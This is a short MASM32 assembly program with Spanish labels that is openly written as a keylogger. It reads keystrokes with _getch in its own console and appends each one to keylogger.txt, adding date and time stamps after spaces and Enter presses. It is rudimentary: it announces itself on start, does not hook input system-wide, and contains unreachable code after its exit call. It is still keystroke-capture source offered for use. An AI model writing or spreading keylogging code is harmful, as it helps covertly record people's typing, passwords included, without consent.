.386
.model flat, stdcall
option casemap:none
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\masm32.inc
include \masm32\include\masm32rt.inc
include \masm32\include\user32.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib
includelib \masm32\lib\user32.lib

WinMain proto :DWORD, :DWORD, :DWORD, :DWORD
.data

	directorio		byte "keylogger.txt",NULL
	error1			db "No se pudo crear el archivo",0
	inicio			db "Keylogger iniciado", 10, 0
	formatofecha	db " dd/MM/yyyy ",0
	formatohora		db " hh:mm:ss ",0

.data?
	fechaAct		db 50 dup(?)
	horaAct			db 50 dup(?)
	manejo			dd ?
	key				dd ?
	bytesw			dd ?
.code
program:
	CALL main
	main PROC

		INVOKE				StdOut, ADDR inicio

		MOV					edx, OFFSET directorio
		
		INVOKE				CreateFile, edx, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL	
		INVOKE				SetFilePointer, eax, 0, 0, FILE_END
		MOV					manejo, EAX
		CMP					EAX, INVALID_HANDLE_VALUE
		JE					fin_programa
		JMP					EscribirFecha
		keylogger:

			CALL			crt__getch
			MOV				key, EAX
			CMP				EAX, 0
			JE				seguir
		    INVOKE			CreateFile, addr directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,0
		    mov				manejo, eax
		    INVOKE			SetFilePointer, manejo, 0, 0, FILE_END
		    INVOKE			WriteFile,manejo,addr key,1,addr bytesw,NULL
		    mov				eax, manejo
		    INVOKE			CloseHandle, eax


		verificacion:

			mov				ebx, key						
			cmp				ebx, 20h						
			jz			EscribirFecha
			cmp				ebx,  0dh						
			jz			EscribirFecha
			jmp				keylogger			

		seguir:
			JMP				keylogger


		fin_programa:
			INVOKE			ExitProcess, 0

			
			INVOKE			CreateFile, ADDR directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
			MOV				manejo, EAX
			INVOKE			SetFilePointer, manejo, 0, 0, FILE_END
			INVOKE			WriteFile, manejo, ADDR key, 1, ADDR bytesw, NULL
			MOV				EAX, manejo
			INVOKE			CloseHandle, EAX
			JMP				verificacion

		EscribirFecha:
		   INVOKE			CreateFile, addr directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,0
			mov				manejo, eax
			INVOKE			SetFilePointer, manejo, 0, 0, FILE_END

			invoke			GetDateFormat, 0,0, \
								0, addr formatofecha, addr fechaAct, 50
			invoke			GetTimeFormat, 0, 0, \
								0, addr formatohora, addr horaAct, 50

			INVOKE			WriteFile,manejo,addr fechaAct,11,addr bytesw,NULL
			INVOKE			WriteFile,manejo,addr horaAct,10,addr bytesw,NULL

			invoke			CloseHandle, manejo
			JMP				seguir

	main ENDP
END program